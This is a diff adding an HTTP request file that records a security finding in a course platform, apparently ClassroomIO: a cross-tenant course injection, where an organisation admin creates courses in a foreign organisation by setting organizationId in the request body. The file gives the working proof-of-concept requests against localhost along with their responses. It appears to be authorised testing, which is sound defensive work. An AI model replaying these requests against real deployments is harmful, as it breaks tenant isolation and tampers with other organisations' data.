@@ -1,0 +1,30 @@
+### VULN-023 — POST /course writes body organizationId (cross-tenant course injection)
+### Admin is ADMIN of header org 48bbdff8 only.
+
+### [Test A] body organizationId != header org — passes validation + authz, only the FK stops a bogus id.
+POST http://localhost:21527/course
+Cookie: classroomio.session_token=<ADMIN_SESSION>
+cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+Content-Type: application/json
+
+{"title":"inj-x","description":"probe","type":"SELF_PACED","organizationId":"94030a8b-6a00-4832-9082-3c4e5dd8c2cf"}
+### -> HTTP 500 {"...":"Failed to create course","code":"INTERNAL_ERROR"}  (FK to organization.id; NOT 400/403)
+
+### [contrast] Authorization is anchored to the HEADER org.
+POST http://localhost:21527/course
+Cookie: classroomio.session_token=<ADMIN_SESSION>
+cio-org-id: 94030a8b-6a00-4832-9082-3c4e5dd8c2cf
+Content-Type: application/json
+
+{"title":"inj-x","description":"probe","type":"SELF_PACED","organizationId":"48bbdff8-2ad5-46a3-a259-2ca3d52677dd"}
+### -> HTTP 403 {"error":"Only organization admins can perform this action","code":"ORG_TEAM_NOT_AUTHORIZED"}
+
+### [Test B / CONFIRMED] body organizationId = a REAL foreign org (admin is NOT a member).
+POST http://localhost:21527/course
+Cookie: classroomio.session_token=<ADMIN_SESSION>
+cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+Content-Type: application/json
+
+{"title":"inj-<rand>","description":"probe","type":"SELF_PACED","organizationId":"f0259e1a-b93d-4f0a-ae75-1939a177e583"}
+### -> HTTP 201. Verified: the created group.organization_id == f0259e1a (the FOREIGN org).
+###    Cross-tenant course injection. Injected course/group deleted after verification.
